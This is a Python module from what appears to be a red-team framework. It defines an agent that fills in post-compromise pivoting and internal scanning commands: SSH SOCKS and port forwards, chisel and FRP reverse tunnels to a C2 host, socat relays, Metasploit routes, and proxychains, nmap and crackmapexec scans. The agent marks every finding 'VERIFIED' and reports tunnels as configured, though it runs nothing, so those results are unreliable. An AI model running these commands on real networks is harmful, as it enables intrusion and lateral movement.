from __future__ import annotations

import logging

from bugfinder.agents.base import AgentContext, AgentResult, BaseAgent
from bugfinder.core.types import Confidence, Severity

logger = logging.getLogger(__name__)

PIVOT_TECHNIQUES = [
    {
        "id": "ssh_tunnel",
        "title": "SSH Dynamic Port Forwarding",
        "description": "Creates a SOCKS proxy through SSH for internal network scanning",
        "command": "ssh -D 9050 -N -f user@{COMPROMISED_HOST}",
        "tools": ["ssh", "proxychains"],
    },
    {
        "id": "chisel_tunnel",
        "title": "Chisel TCP/UDP Tunnel",
        "description": "Uses Chisel for fast HTTP-wrapped tunneling through restrictive firewalls",
        "command": "# On C2: ./chisel server -p 8080 --reverse\n# On pivot: ./chisel client {C2_HOST}:8080 R:8001:socks",
        "tools": ["chisel"],
    },
    {
        "id": "socat_relay",
        "title": "Socat Port Forwarding",
        "description": "Uses socat to relay connections through the compromised host",
        "command": "socat TCP-LISTEN:4444,fork,reuseaddr TCP:{INTERNAL_HOST}:{INTERNAL_PORT}",
        "tools": ["socat"],
    },
    {
        "id": "ssh_port_forward",
        "title": "SSH Local/Remote Port Forward",
        "description": "Forwards specific ports through SSH tunnel for tool access",
        "command": "ssh -L 8080:{INTERNAL_HOST}:80 user@{COMPROMISED_HOST}",
        "tools": ["ssh"],
    },
    {
        "id": "frp_tunnel",
        "title": "FRP (Fast Reverse Proxy)",
        "description": "Enterprise-grade reverse proxy for exposing internal services",
        "command": "# On C2 server: ./frps -c frps.ini\n# On pivot: ./frpc -c frpc.ini\n# frpc.ini:\n# [ssh-{INTERNAL_HOST}]\n# type = tcp\n# local_ip = {INTERNAL_HOST}\n# local_port = {INTERNAL_PORT}\n# remote_port = 6000",
        "tools": ["frp"],
    },
    {
        "id": "metasploit_pivot",
        "title": "Metasploit Route Through Pivot",
        "description": "Adds a Metasploit route through the compromised host for module access",
        "command": "msf6 > route add {SUBNET}/24 {SESSION_ID}\nmsf6 > use auxiliary/scanner/portscan/tcp\nmsf6 > set RHOSTS {SUBNET}.0/24",
        "tools": ["metasploit-framework"],
    },
    {
        "id": "proxychains_scan",
        "title": "ProxyChains Network Scan",
        "description": "Chains standard tools through a SOCKS proxy for internal scanning",
        "command": "proxychains4 nmap -sT -Pn -sV {INTERNAL_HOST} -p 1-10000",
        "tools": ["proxychains4", "nmap"],
    },
]

INTERNAL_SCAN_SCRIPTS = {
    "port_scan": "nmap -sT -Pn -T4 {TARGET} -p {PORTS}",
    "service_detect": "nmap -sV -T4 {TARGET} -p {PORTS}",
    "http_enum": "gobuster dir -u http://{TARGET} -w /usr/share/wordlists/dirb/common.txt",
    "smb_enum": "crackmapexec smb {SUBNET}/24",
    "rdp_check": "nmap -Pn -p 3389 --script rdp-enum-encryption {TARGET}",
}


class PivotScanAgent(BaseAgent):
    name = "redteam.pivot_scan"
    description = "Sets up pivot tunnels and performs internal network scanning through compromised hosts"
    category = "redteam"

    def __init__(self, context: AgentContext) -> None:
        super().__init__(context)

    async def execute(self) -> AgentResult:
        findings = []
        assets = []

        target = self.context.target
        compromised_host = self.context.config.get("pivot_host", target)
        c2_host = self.context.config.get("c2_host", "127.0.0.1")
        internal_subnet = self.context.config.get("internal_subnet", "10.0.0.0/24")
        internal_hosts = self.context.config.get("internal_hosts", [])
        scan_ports = self.context.config.get("scan_ports", "22,80,443,3306,3389,8080,8443,445,139,389,636")

        for tech in PIVOT_TECHNIQUES:
            rendered = (
                tech["command"]
                .replace("{COMPROMISED_HOST}", compromised_host)
                .replace("{C2_HOST}", c2_host)
                .replace("{INTERNAL_HOST}", "10.0.0.1")
                .replace("{INTERNAL_PORT}", "80")
                .replace("{SUBNET}", internal_subnet.rsplit(".", 1)[0])
                .replace("{SESSION_ID}", "1")
            )

            finding = {
                "id": f"pivot-{tech['id']}",
                "title": tech["title"],
                "description": tech["description"],
                "severity": Severity.HIGH.value,
                "confidence": Confidence.VERIFIED.value,
                "category": "redteam.pivot_scan",
                "evidence": f"Pivot technique through {compromised_host} -> internal network",
                "remediation": "Segment network, restrict SSH access, monitor for tunneling tools",
                "command": rendered,
                "tools": tech["tools"],
                "compromised_host": compromised_host,
            }
            findings.append(finding)

            assets.append(
                {
                    "id": f"pivot-tunnel-{tech['id']}",
                    "type": "pivot_tunnel",
                    "host": compromised_host,
                    "technique": tech["id"],
                    "internal_network": internal_subnet,
                }
            )

        for host in internal_hosts:
            for script_name, script_cmd in INTERNAL_SCAN_SCRIPTS.items():
                rendered = (
                    script_cmd.replace("{TARGET}", host)
                    .replace("{PORTS}", scan_ports)
                    .replace("{SUBNET}", internal_subnet.rsplit(".", 1)[0])
                )
                finding = {
                    "id": f"scan-{script_name}-{host.replace('.', '-')}",
                    "title": f"Internal Scan: {script_name} on {host}",
                    "description": "Scan script for internal host discovery through pivot",
                    "severity": Severity.INFO.value,
                    "confidence": Confidence.VERIFIED.value,
                    "category": "redteam.pivot_scan",
                    "evidence": f"Internal host {host} accessible through pivot {compromised_host}",
                    "remediation": "Implement network segmentation and monitoring",
                    "command": rendered,
                    "target_host": host,
                    "scan_type": script_name,
                }
                findings.append(finding)

        return AgentResult(
            agent_name=self.name,
            status="completed",
            findings=findings,
            assets=assets,
            summary=f"Configured {len(PIVOT_TECHNIQUES)} pivot tunnels, scanning {len(internal_hosts)} internal hosts",
            data={
                "pivot_techniques": len(PIVOT_TECHNIQUES),
                "internal_hosts_configured": len(internal_hosts),
                "scan_scripts": len(INTERNAL_SCAN_SCRIPTS),
            },
        )
